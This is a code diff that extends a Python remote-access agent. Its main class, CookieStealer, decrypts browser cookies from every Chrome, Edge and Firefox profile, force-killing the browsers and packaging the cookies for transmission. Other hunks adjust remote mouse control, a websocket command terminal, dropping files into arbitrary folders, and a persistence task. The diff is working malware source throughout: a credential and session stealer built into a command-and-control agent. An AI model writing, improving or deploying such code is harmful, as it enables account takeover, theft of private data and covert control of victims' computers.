@@ -685,11 +685,11 @@ class CookieStealer:
         
         # Browser configurations
         self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
-        self.CHROME_USER_DATA_DIR = rf'{{os.getenv("LOCALAPPDATA")}}\Google\Chrome\User Data'
+        self.CHROME_USER_DATA_DIR = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
         self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')
 
         self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
-        self.EDGE_USER_DATA_DIR = rf'{{os.getenv("LOCALAPPDATA")}}\Microsoft\Edge\User Data'
+        self.EDGE_USER_DATA_DIR = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
         self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')
 
         self.FIREFOX_PROFILE_DIRS = [
@@ -700,324 +700,342 @@ class CookieStealer:
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
 
     def steal_cookies(self):
-        """Main method to steal cookies from all browsers"""
+        """Main method to steal cookies from all browsers and all profiles"""
         results = []
         
         # Chrome
-        chrome_data = self._process_browser_cookies(
+        chrome_results = self._process_browser_cookies(
             'chrome',
             self.CHROME_PATH,
             self.chrome_debug_port,
             self.CHROME_USER_DATA_DIR
         )
-        if chrome_data:
-            results.append(chrome_data)
+        if chrome_results:
+            if isinstance(chrome_results, list):
+                results.extend(chrome_results)
+            else:
+                results.append(chrome_results)
         
         # Edge
-        edge_data = self._process_browser_cookies(
+        edge_results = self._process_browser_cookies(
             'edge',
             self.EDGE_PATH,
             self.edge_debug_port,
             self.EDGE_USER_DATA_DIR
         )
-        if edge_data:
-            results.append(edge_data)
+        if edge_results:
+            if isinstance(edge_results, list):
+                results.extend(edge_results)
+            else:
+                results.append(edge_results)
         
         # Firefox
         firefox_data = self._process_firefox_cookies()
         if firefox_data:
-            results.append(firefox_data)
+            if isinstance(firefox_data, list):
+                results.extend(firefox_data)
+            else:
+                results.append(firefox_data)
         
         return results
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
-        """Process Chrome/Edge cookies"""
-        proc = None
-        junction_paths = []
+        """Process all Chrome/Edge profiles found in User Data folder using direct SQLite extraction"""
+        all_browser_results = []
         try:
-            self._log('info', f"Processing {{browser_name}} cookies")
+            self._log('info', f"Processing {{browser_name}} cookies (Direct SQLite)")
 
-            # Start browser in debug mode
-            proc, junction_paths = self._start_browser_debug(browser_path, port, user_data_dir)
-            if not proc:
+            if not os.path.exists(user_data_dir):
+                self._log('error', f"User data directory not found: {{user_data_dir}}")
                 return None
 
-            # Wait for browser to start
-            time.sleep(5)
-
-            # Get cookies via debug protocol
-            debug_result = self._get_cookies_via_debug(port)
-
-            # Clean up browser process
-            proc.terminate()
-            proc.wait()
-
-            if not debug_result or not isinstance(debug_result, dict) or not debug_result.get('cookies'):
+            # Get Master Key for decryption
+            master_key = self._get_master_key(user_data_dir)
+            if not master_key:
+                self._log('error', f"Failed to retrieve master key for {{browser_name}}")
                 return None
 
-            cookies = debug_result['cookies']
-            browser_user_agent = debug_result.get('browser_user_agent', 'Unknown')
+            # Identify all profile directories
+            profiles = []
+            if os.path.exists(os.path.join(user_data_dir, 'Default')):
+                profiles.append('Default')
+            
+            for item in os.listdir(user_data_dir):
+                if item.startswith('Profile ') and os.path.isdir(os.path.join(user_data_dir, item)):
+                    profiles.append(item)
+            
+            if not profiles:
+                profiles = ['Default']
 
-            # Transform cookies to standard format
-            transformed = self._transform_cookies(cookies)
+            self._log('info', f"Found {{len(profiles)}} {{browser_name}} profiles: {{', '.join(profiles)}}")
 
-            # Package cookies for transmission
-            return self._package_cookies(transformed, browser_name, browser_user_agent)
+            for profile in profiles:
+                try:
+                    self._log('info', f"Attempting direct extraction for profile: {{profile}}")
+                    
+                    # Kill browser to release locks
+                    self._kill_browser(os.path.basename(browser_path))
+
+                    # Locate cookie database (check both old and new locations)
+                    cookie_locations = [
+                        os.path.join(user_data_dir, profile, 'Network', 'Cookies'),
+                        os.path.join(user_data_dir, profile, 'Cookies')
+                    ]
+                    
+                    cookie_db_path = None
+                    for loc in cookie_locations:
+                        if os.path.exists(loc):
+                            cookie_db_path = loc
+                            break
+                    
+                    if not cookie_db_path:
+                        self._log('warning', f"Cookies file not found for {{browser_name}} profile {{profile}}")
+                        continue
+
+                    # Extract cookies using SQLite and Master Key
+                    cookies = self._extract_chromium_cookies(cookie_db_path, master_key)
+                    if not cookies:
+                        continue
+
+                    # Transform cookies to standard format
+                    transformed = self._transform_cookies(cookies)
+
+                    # Package cookies for transmission
+                    packaged = self._package_cookies(transformed, f"{{browser_name}}_{{profile.lower().replace(' ', '_')}}")
+                    if packaged:
+                        all_browser_results.append(packaged)
+
+                except Exception as e:
+                    self._log('error', f"Error processing {{browser_name}} profile {{profile}}: {{str(e)}}")
+                    continue
+
+            return all_browser_results if all_browser_results else None
 
         except Exception as e:
             self._log('error', f"{{browser_name}} cookie processing failed: {{str(e)}}")
             return None
-        finally:
-            # Forcefully remove junctions after use
-            for junction_path in junction_paths:
-                try:
-                    if os.path.exists(junction_path):
-                        if os.path.isdir(junction_path):
-                            subprocess.run(['cmd', '/c', 'rmdir', junction_path], check=True)
-                        else:
-                            os.remove(junction_path)
-                    self._log('info', f"Cleaned up junction: {{junction_path}}")
-                    # Remove from used names set after cleanup
-                    junction_name = os.path.basename(junction_path)
-                    self.used_junction_names.discard(junction_name)
-                except Exception as e:
-                    self._log('error', f"Failed to clean up junction {{junction_path}}: {{str(e)}}")
+
+    def _get_master_key(self, user_data_dir):
+        """Retrieve and decrypt the Chromium master key from Local State"""
+        try:
+            local_state_path = os.path.join(user_data_dir, 'Local State')
+            if not os.path.exists(local_state_path):
+                return None
+
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.loads(f.read())
+
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            # Remove 'DPAPI' prefix
+            encrypted_key = encrypted_key[5:]
+
+            # Decrypt using DPAPI (CryptUnprotectData)
+            import ctypes
+            from ctypes import wintypes
+
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
+
+            p_data_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+            p_data_out = DATA_BLOB()
+            p_optional_entropy = None
+            p_reserved = None
+            p_prompt_struct = None
+            dw_flags = 0x01 # CRYPTPROTECT_UI_FORBIDDEN
+
+            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, p_optional_entropy, p_reserved, p_prompt_struct, dw_flags, ctypes.byref(p_data_out)):
+                decrypted_key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
+                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
+                return decrypted_key
+            return None
+        except Exception as e:
+            self._log('error', f"Failed to get master key: {{str(e)}}")
+            return None
+
+    def _decrypt_chromium_value(self, value, master_key):
+        """Decrypt Chromium cookie value (v10/AES-GCM or DPAPI)"""
+        try:
+            if value[:3] == b'v10' or value[:3] == b'v11':
+                iv = value[3:15]
+                payload = value[15:]
+                # The payload contains the tag at the end (16 bytes)
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted = cipher.decrypt(payload)
+                # Remove auth tag (last 16 bytes)
+                return decrypted[:-16].decode('utf-8', errors='ignore')
+            else:
+                # Older versions used DPAPI directly
+                import ctypes
+                from ctypes import wintypes
+
+                class DATA_BLOB(ctypes.Structure):
+                    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
+
+                p_data_in = DATA_BLOB(len(value), ctypes.create_string_buffer(value))
+                p_data_out = DATA_BLOB()
+                
+                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0x01, ctypes.byref(p_data_out)):
+                    decrypted = ctypes.string_at(p_data_out.pbData, p_data_out.cbData).decode('utf-8', errors='ignore')
+                    ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
+                    return decrypted
+                return ""
+        except Exception as e:
+            return ""
+
+    def _extract_chromium_cookies(self, cookie_db_path, master_key):
+        """Extract and decrypt cookies from Chromium SQLite database"""
+        temp_dir = os.getenv('TEMP')
+        db_name = f"cr_sq_{{os.path.basename(os.path.dirname(os.path.dirname(cookie_db_path)))}}.db"
+        temp_db = os.path.join(temp_dir, db_name)
+        
+        try:
+            import shutil
+            # Attempt to copy file. Even if locked, copying might work if browser is just reading
+            # But we already killed the browser in the caller.
+            shutil.copy2(cookie_db_path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Chromium cookie table columns: host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value, samesite
+            cursor.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value, samesite FROM cookies")
+            rows = cursor.fetchall()
+            
+            cookies = []
+            for row in rows:
+                host, name, path, expires, secure, httponly, encrypted_val, samesite = row
+                decrypted_val = self._decrypt_chromium_value(encrypted_val, master_key)
+                
+                cookies.append({{
+                    'domain': host,
+                    'name': name,
+                    'path': path,
+                    'expires': expires / 1000000 - 11644473600 if expires > 0 else 0, # Convert WebKit timestamp
+                    'secure': bool(secure),
+                    'httpOnly': bool(httponly),
+                    'value': decrypted_val,
+                    'sameSite': self._map_chromium_samesite(samesite)
+                }})
+            
+            conn.close()
+            os.remove(temp_db)
+            return cookies
+        except Exception as e:
+            self._log('error', f"Chromium SQLite extraction failed: {{str(e)}}")
+            if os.path.exists(temp_db):
+                try: os.remove(temp_db)
+                except: pass
+            return []
+
+    def _map_chromium_samesite(self, samesite_val):
+        """Map Chromium samesite integer to string"""
+        # Chromium mapping: -1=unspecified, 0=no_restriction, 1=lax, 2=strict
+        mapping = {{
+            -1: 'unspecified',
+            0: 'no_restriction',
+            1: 'lax',
+            2: 'strict'
+        }}
+        return mapping.get(samesite_val, 'unspecified')
 
     def _process_firefox_cookies(self):
-        """Process Firefox cookies"""
+        """Process all Firefox profile cookies and aggregate results"""
         try:
             self._log('info', "Processing Firefox cookies")
+            all_firefox_data = []
             
-            # Find Firefox profile
-            profile_dir = self._find_firefox_profile()
-            if not profile_dir:
+            # Find all Firefox profiles
+            profile_dirs = self._find_firefox_profile()
+            if not profile_dirs:
                 return None
 
-            # Extract cookies from SQLite database
-            cookies = self._extract_firefox_cookies(profile_dir)
-            if not cookies:
-                return None
+            for profile_dir in profile_dirs:
+                try:
+                    self._log('info', f"Extracting cookies from profile: {{profile_dir}}")
+                    # Extract cookies from SQLite database
+                    cookies = self._extract_firefox_cookies(profile_dir)
+                    if not cookies:
+                        continue
 
-            # Transform to standard format
-            transformed = self._transform_cookies(cookies)
-            
-            # Package for transmission
-            return self._package_cookies(transformed, 'firefox')
+                    # Transform to standard format
+                    transformed = self._transform_cookies(cookies)
+                    
+                    # Package for transmission
+                    packaged = self._package_cookies(transformed, f"firefox_{{os.path.basename(profile_dir)}}")
+                    if packaged:
+                        all_firefox_data.append(packaged)
+                except Exception as e:
+                    self._log('error', f"Error processing Firefox profile {{profile_dir}}: {{str(e)}}")
+                    continue
+
+            return all_firefox_data if all_firefox_data else None
 
         except Exception as e:
             self._log('error', f"Firefox cookie processing failed: {{str(e)}}")
             return None
 
     def _transform_cookies(self, cookies):
-        """Transform cookies into standard format with corrected sameSite values"""
+        """Transform cookies from any source into standard format"""
         transformed = []
         for cookie in cookies:
-            if len(cookie) == 8:  # Firefox cookies
-                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
-            else:  # Chrome/Edge cookies
-                name = cookie['name']
-                value = cookie['value']
-                domain = cookie['domain']
-                path = cookie['path']
+            if isinstance(cookie, dict):
+                # Chromium format (already a dict)
+                domain = cookie.get('domain', '')
                 expiry = cookie.get('expires', 0)
                 is_secure = cookie.get('secure', False)
                 is_http_only = cookie.get('httpOnly', False)
+                name = cookie.get('name', '')
+                path = cookie.get('path', '')
                 same_site = cookie.get('sameSite', 'unspecified')
-            
-            # Fix sameSite values to match allowed options
-            if same_site.lower() == 'none':
-                same_site = 'no_restriction'
-            elif same_site.lower() == 'lax':
-                same_site = 'lax'
-            elif same_site.lower() == 'strict':
-                same_site = 'strict'
+                value = cookie.get('value', '')
+            elif len(cookie) == 8:
+                # Firefox tuple format
+                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
             else:
-                same_site = 'unspecified'  # default if not matching any known value
+                continue
+
+            # Fix sameSite values to match allowed options
+            if isinstance(same_site, str):
+                ss_lower = same_site.lower()
+                if ss_lower == 'none': same_site = 'no_restriction'
+                elif ss_lower == 'lax': same_site = 'lax'
+                elif ss_lower == 'strict': same_site = 'strict'
+                else: same_site = 'unspecified'
+            else:
+                same_site = 'unspecified'
             
             transformed_cookie = {{
                 "domain": domain,
-                "expirationDate": expiry,
+                "expirationDate": int(expiry),
                 "hostOnly": not domain.startswith('.'),
                 "httpOnly": bool(is_http_only),
                 "name": name,
                 "path": path,
                 "sameSite": same_site,
                 "secure": bool(is_secure),
-                "session": expiry == 0,
+                "session": int(expiry) == 0,
                 "storeId": "0",
                 "value": value
             }}
             transformed.append(transformed_cookie)
         return transformed
 
-    def _create_junctions(self):
-        """Create junctions for Chrome and Edge user data directories with random names"""
-        temp_dir = os.getenv('TEMP')
-        # Generate unique random 8-character alphabetic names
-        chrome_junction_name = None
-        edge_junction_name = None
-
-        # Generate unique name for Chrome junction
-        while True:
-            chrome_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
-            if chrome_junction_name not in self.used_junction_names:
-                self.used_junction_names.add(chrome_junction_name)
-                break
-
-        # Generate unique name for Edge junction
-        while True:
-            edge_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
-            if edge_junction_name not in self.used_junction_names:
-                self.used_junction_names.add(edge_junction_name)
-                break
-
-        chrome_junction = os.path.join(temp_dir, chrome_junction_name)
-        edge_junction = os.path.join(temp_dir, edge_junction_name)
-
-        # Remove existing junctions if they exist
-        for junction in [chrome_junction, edge_junction]:
-            if os.path.exists(junction):
-                try:
-                    if os.path.isdir(junction):
-                        subprocess.run(['cmd', '/c', 'rmdir', junction], check=True)
-                    else:
-                        os.remove(junction)
-                except Exception as e:
-                    self._log('error', f"Failed to remove existing junction {{junction}}: {{str(e)}}")
-
-        # Create junctions using mklink /j
-        try:
-            subprocess.check_call(f'mklink /j "{{chrome_junction}}" "{{self.CHROME_USER_DATA_DIR}}"', shell=True)
-            self._log('info', f"Created junction {{chrome_junction}} -> {{self.CHROME_USER_DATA_DIR}}")
-        except Exception as e:
-            self._log('error', f"Failed to create junction for Chrome: {{str(e)}}")
-
-        try:
-            subprocess.check_call(f'mklink /j "{{edge_junction}}" "{{self.EDGE_USER_DATA_DIR}}"', shell=True)
-            self._log('info', f"Created junction {{edge_junction}} -> {{self.EDGE_USER_DATA_DIR}}")
-        except Exception as e:
-            self._log('error', f"Failed to create junction for Edge: {{str(e)}}")
-
-        return chrome_junction, edge_junction
-
-    def _start_browser_debug(self, browser_path, port, user_data_dir):
-        """Start browser in debug mode"""
-        try:
-            self._kill_browser(os.path.basename(browser_path))
-
-            # Create junctions and use them if user_data_dir matches Chrome or Edge paths
-            chrome_junction, edge_junction = self._create_junctions()
-            junction_paths = [chrome_junction, edge_junction]  # Track junctions for cleanup
-            if user_data_dir == self.CHROME_USER_DATA_DIR:
-                user_data_dir = chrome_junction
-            elif user_data_dir == self.EDGE_USER_DATA_DIR:
-                user_data_dir = edge_junction
-
-            command = [
-                browser_path,
-                f'--remote-debugging-port={{port}}',
-                '--remote-allow-origins=*',
-                '--no-first-run',
-                '--no-default-browser-check',
-                '--headless',
-                f'--user-data-dir={{user_data_dir}}'
-            ]
-            proc = subprocess.Popen(command,
-                                  stdout=subprocess.DEVNULL,
-                                  stderr=subprocess.DEVNULL)
-            return proc, junction_paths
-        except Exception as e:
-            self._log('error', f"Failed to start browser: {{str(e)}}")
-            return None, []
-
     def _kill_browser(self, process_name):
-        """Kill browser process if running"""
+        """Kill browser processes and all children aggressively"""
         try:
-            subprocess.run(f'taskkill /F /IM {{process_name}}', shell=True,
+            # Kill by image name, forcing all instances and sub-processes to close
+            subprocess.run(f'taskkill /F /T /IM {{process_name}}', shell=True,
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Short sleep to allow OS to release file handles
+            time.sleep(2)
         except:
             pass
 
-    def _get_cookies_via_debug(self, port):
-        import websocket
-        """Get cookies using Chrome DevTools Protocol with proper Network domain enablement"""
-        try:
-            debug_url = f'http://localhost:{{port}}/json'
-            response = requests.get(debug_url, timeout=self.timeout)
-            response.raise_for_status()
-
-            data = response.json()
-            if not data:
-                return []
-
-            ws_url = data[0]['webSocketDebuggerUrl']
-            ws = websocket.create_connection(ws_url, timeout=self.timeout)
-
-            # Enable Network domain (required for cookie operations)
-            ws.send(json.dumps({{
-                'id': 1,
-                'method': 'Network.enable'
-            }}))
-
-            # Wait for Network.enable response
-            network_response = json.loads(ws.recv())
-            if 'error' in network_response:
-                self._log('error', f"Network.enable failed: {{network_response['error']}}")
-                return []
-
-            # Get browser User-Agent
-            ws.send(json.dumps({{
-                'id': 2,
-                'method': 'Runtime.evaluate',
-                'params': {{
-                    'expression': 'navigator.userAgent',
-                    'returnByValue': True
-                }}
-            }}))
-
-            ua_response = json.loads(ws.recv())
-            browser_user_agent = 'Unknown'
-            if 'result' in ua_response and 'result' in ua_response['result']:
-                full_ua = ua_response['result']['result'].get('value', 'Unknown')
-                # Extract browser-specific part and remove Headless
-                if 'Chrome/' in full_ua:
-                    # For Chrome/Edge, extract from Chrome/ onwards
-                    chrome_part = full_ua.split('Chrome/')[1]
-                    browser_user_agent = f"Chrome/{{chrome_part}}".replace('Headless', '').strip()
-                elif 'Firefox/' in full_ua:
-                    # For Firefox, extract from Firefox/ onwards
-                    firefox_part = full_ua.split('Firefox/')[1].split(' ')[0]
-                    browser_user_agent = f"Firefox/{{firefox_part}}"
-                else:
-                    browser_user_agent = full_ua.replace('Headless', '').strip()
-
-            # Now get all cookies
-            ws.send(json.dumps({{
-                'id': 3,
-                'method': 'Network.getAllCookies'
-            }}))
-
-            cookies_response = json.loads(ws.recv())
-            if 'result' in cookies_response and 'cookies' in cookies_response['result']:
-                # Return both cookies and browser user agent
-                return {{
-                    'cookies': cookies_response['result']['cookies'],
-                    'browser_user_agent': browser_user_agent
-                }}
-            else:
-                self._log('error', f"Unexpected cookies response format: {{cookies_response}}")
-                return []
-        except Exception as e:
-            self._log('error', f"Debug protocol error: {{str(e)}}")
-            return []
-        finally:
-            if 'ws' in locals():
-                ws.close()
-
     def _find_firefox_profile(self):
-        """Find Firefox profile directory, checking multiple possible locations"""
+        """Find all Firefox profile directories that contain cookies.sqlite"""
         try:
-            all_profiles = []
+            profile_paths = []
+            all_potential_profiles = []
 
             # Check all possible Firefox profile directories
             for profile_dir in self.FIREFOX_PROFILE_DIRS:
@@ -1031,85 +1049,124 @@ class CookieStealer:
                                 for item in os.listdir(matched_dir):
                                     profile_path = os.path.join(matched_dir, item)
                                     if os.path.isdir(profile_path):
-                                        all_profiles.append(profile_path)
+                                        all_potential_profiles.append(profile_path)
                     else:
                         if os.path.exists(profile_dir):
                             for item in os.listdir(profile_dir):
                                 profile_path = os.path.join(profile_dir, item)
                                 if os.path.isdir(profile_path):
-                                    all_profiles.append(profile_path)
+                                    all_potential_profiles.append(profile_path)
                 except Exception as e:
                     self._log('error', f"Error checking profile directory {{profile_dir}}: {{str(e)}}")
                     continue
 
-            if not all_profiles:
-                return None
-
-            # First, try to find profiles with cookies.sqlite (indicating active profiles)
-            for profile in all_profiles:
+            # Identify profiles that actually have a cookies database
+            for profile in all_potential_profiles:
                 cookies_db = os.path.join(profile, 'cookies.sqlite')
                 if os.path.exists(cookies_db):
                     self._log('info', f"Found Firefox profile with cookies: {{profile}}")
-                    return profile
+                    profile_paths.append(profile)
 
-            # If no profile has cookies.sqlite, return the most recently modified profile
-            # (Firefox may create profiles that haven't been used yet)
-            if all_profiles:
-                most_recent = max(all_profiles, key=os.path.getmtime)
-                self._log('info', f"Using most recent Firefox profile: {{most_recent}}")
-                return most_recent
-
-            return None
+            return profile_paths
         except Exception as e:
-            self._log('error', f"Failed to find Firefox profile: {{str(e)}}")
-            return None
+            self._log('error', f"Failed to find Firefox profiles: {{str(e)}}")
+            return []
 
     def _extract_firefox_cookies(self, profile_dir):
-        """Extract cookies from Firefox SQLite database"""
+        """Extract cookies from Firefox SQLite database with WAL and table verification"""
+        temp_dir = os.getenv('TEMP')
+        base_name = os.path.basename(profile_dir)
+        temp_db = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite")
+        temp_wal = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite-wal")
+        temp_shm = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite-shm")
+        
         try:
             cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
             if not os.path.exists(cookies_db):
                 return []
+
+            # Copy all 3 files to handle WAL mode (important when Firefox is running)
+            import shutil
+            shutil.copy2(cookies_db, temp_db)
+            if os.path.exists(cookies_db + "-wal"):
+                shutil.copy2(cookies_db + "-wal", temp_wal)
+            if os.path.exists(cookies_db + "-shm"):
+                shutil.copy2(cookies_db + "-shm", temp_shm)
                 
-            conn = sqlite3.connect(cookies_db)
+            conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             
-            # Modified query to ensure all fields are properly handled
-            cursor.execute("""
-                SELECT 
-                    CAST(name AS TEXT) as name,
-                    CAST(value AS TEXT) as value,
-                    CAST(host AS TEXT) as host,
-                    CAST(path AS TEXT) as path,
-                    CAST(expiry AS INTEGER) as expiry,
-                    CAST(isSecure AS INTEGER) as isSecure,
-                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
-                    CAST(sameSite AS INTEGER) as sameSite 
-                FROM moz_cookies
-            """)
+            # Check for alternate cookie tables (Firefox occasionally changes schema)
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND (name='moz_cookies' OR name='cookies')")
+            table_name_row = cursor.fetchone()
+            if not table_name_row:
+                self._log('warning', f"No cookie table found in {{base_name}}")
+                conn.close()
+                return []
+            
+            table_name = table_name_row[0]
+
+            # Identify available columns
+            cursor.execute(f"PRAGMA table_info({{table_name}})")
+            columns = [col[1] for col in cursor.fetchall()]
+            
+            query_cols = []
+            # Map standard fields to possible column names
+            mapping = {{
+                'name': ['name'],
+                'value': ['value'],
+                'host': ['host', 'domain'],
+                'path': ['path'],
+                'expiry': ['expiry', 'expires'],
+                'isSecure': ['isSecure', 'secure'],
+                'isHttpOnly': ['isHttpOnly', 'httponly'],
+                'sameSite': ['sameSite', 'samesite']
+            }}
+            
+            for field, possible_cols in mapping.items():
+                found = False
+                for col in possible_cols:
+                    if col in columns:
+                        query_cols.append(col)
+                        found = True
+                        break
+                if not found:
+                    query_cols.append("''")
+            
+            cursor.execute(f"SELECT {{', '.join(query_cols)}} FROM {{table_name}}")
+            rows = cursor.fetchall()
+            
+            self._log('info', f"Found {{len(rows)}} cookies in Firefox profile: {{base_name}}")
             
             cookies = []
-            for row in cursor.fetchall():
+            for row in rows:
                 try:
-                    # Ensure all values are properly converted
                     cookies.append((
-                        str(row[0]),  # name
-                        str(row[1]),  # value
-                        str(row[2]),  # host
-                        str(row[3]),  # path
-                        int(row[4]) if row[4] else 0,  # expiry
-                        bool(row[5]),  # isSecure
-                        bool(row[6]),  # isHttpOnly
-                        str(row[7]) if row[7] else 'none'  # sameSite
+                        str(row[0]) if row[0] else "",  # name
+                        str(row[1]) if row[1] else "",  # value
+                        str(row[2]) if row[2] else "",  # host
+                        str(row[3]) if row[3] else "",  # path
+                        int(row[4]) if row[4] else 0,   # expiry
+                        bool(row[5]),                   # isSecure
+                        bool(row[6]),                   # isHttpOnly
+                        str(row[7]) if row[7] else '0'  # sameSite
                     ))
-                except Exception as e:
-                    self._log('error', f"Error processing Firefox cookie: {{str(e)}}")
+                except:
                     continue
             
             conn.close()
+            # Cleanup
+            for f in [temp_db, temp_wal, temp_shm]:
+                if os.path.exists(f):
+                    try: os.remove(f)
+                    except: pass
             return cookies
         except Exception as e:
-            self._log('error', f"Failed to extract Firefox cookies: {{str(e)}}")
+            self._log('error', f"Firefox extraction failed for {{base_name}}: {{str(e)}}")
+            for f in [temp_db, temp_wal, temp_shm]:
+                if os.path.exists(f):
+                    try: os.remove(f)
+                    except: pass
             return []
 
     def _get_system_info(self):
@@ -1418,21 +1475,34 @@ class SystemUtils:
             return {{"error": str(e)}}
 
     @staticmethod
-    def download_file(filename, data):
+    def download_file(filename, data, folder=None):
         try:
             file_data = base64.b64decode(data)
-            downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
-            filepath = os.path.join(downloads_dir, filename)
-            
+
+            # Use provided folder or default to Downloads
+            if folder:
+                target_dir = folder
+            else:
+                target_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
+
+            # Expand environment variables in folder path
+            target_dir = os.path.expandvars(target_dir)
+
+            # Create directory if it doesn't exist
+            if not os.path.exists(target_dir):
+                os.makedirs(target_dir, exist_ok=True)
+
+            filepath = os.path.join(target_dir, filename)
+
             counter = 1
             while os.path.exists(filepath):
                 name, ext = os.path.splitext(filename)
-                filepath = os.path.join(downloads_dir, f"{{name}}_{{counter}}{{ext}}")
+                filepath = os.path.join(target_dir, f"{{name}}_{{counter}}{{ext}}")
                 counter += 1
-            
+
             with open(filepath, "wb") as f:
                 f.write(file_data)
-            
+
             return {{"status": "success", "path": filepath}}
         except Exception as e:
             return {{"error": str(e)}}
@@ -2156,15 +2226,15 @@ class RemoteDesktopHandler:
                     if x is not None and y is not None:
                         # Frontend sends coordinates in screenshot resolution
                         # These coordinates should match pyautogui.size() exactly
-                        x_screen = int(x)
-                        y_screen = int(y)
+                        x_screen = float(x)
+                        y_screen = float(y)
                         
                         # Get actual screen size
                         screen_width, screen_height = pyautogui.size()
                         
                         # Clamp coordinates to screen bounds
-                        x_screen = max(0, min(x_screen, screen_width - 1))
-                        y_screen = max(0, min(y_screen, screen_height - 1))
+                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
+                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                         
                         # Move mouse directly - no scaling needed
                         pyautogui.moveTo(x_screen, y_screen)
@@ -2180,15 +2250,15 @@ class RemoteDesktopHandler:
                     button = data.get('button', 'left')
                     if x is not None and y is not None:
                         # Frontend sends coordinates in screenshot resolution
-                        x_screen = int(x)
-                        y_screen = int(y)
+                        x_screen = float(x)
+                        y_screen = float(y)
                         
                         # Get actual screen size
                         screen_width, screen_height = pyautogui.size()
                         
                         # Clamp coordinates to screen bounds
-                        x_screen = max(0, min(x_screen, screen_width - 1))
-                        y_screen = max(0, min(y_screen, screen_height - 1))
+                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
+                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                         
                         # Click directly - no scaling needed
                         pyautogui.click(x_screen, y_screen, button=button)
@@ -2204,15 +2274,15 @@ class RemoteDesktopHandler:
                     direction = data.get('direction', 'down')
                     if x is not None and y is not None:
                         # Frontend sends coordinates in screenshot resolution
-                        x_screen = int(x)
-                        y_screen = int(y)
+                        x_screen = float(x)
+                        y_screen = float(y)
                         
                         # Get actual screen size
                         screen_width, screen_height = pyautogui.size()
                         
                         # Clamp coordinates to screen bounds
-                        x_screen = max(0, min(x_screen, screen_width - 1))
-                        y_screen = max(0, min(y_screen, screen_height - 1))
+                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
+                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                         
                         # Move mouse to position first
                         pyautogui.moveTo(x_screen, y_screen)
@@ -2512,6 +2582,16 @@ class WebSocketClient:
                         'error': f"Command processing error: {{str(e)}}",
                         'current_dir': self.current_dir
                     }}, namespace='/terminal')
+
+            @self.socket.on('get_current_dir', namespace='/terminal')
+            def on_get_current_dir(data):
+                self.socket.emit('command_result', {{
+                    'agent_id': self.agent_id,
+                    'command': '',
+                    'output': '',
+                    'error': '',
+                    'current_dir': self.current_dir
+                }}, namespace='/terminal')
 
             @self.socket.on('kill_process', namespace='/terminal')
             def on_kill_process(data):
@@ -3398,8 +3478,9 @@ class Agent:
             
             elif task_type == "download":
                 return SystemUtils.download_file(
-                    task.get("filename", ""), 
-                    task.get("data", ""))
+                    task.get("filename", ""),
+                    task.get("data", ""),
+                    task.get("folder", None))
             
             elif task_type == "persist":
                 self._log_info("Installing persistence")
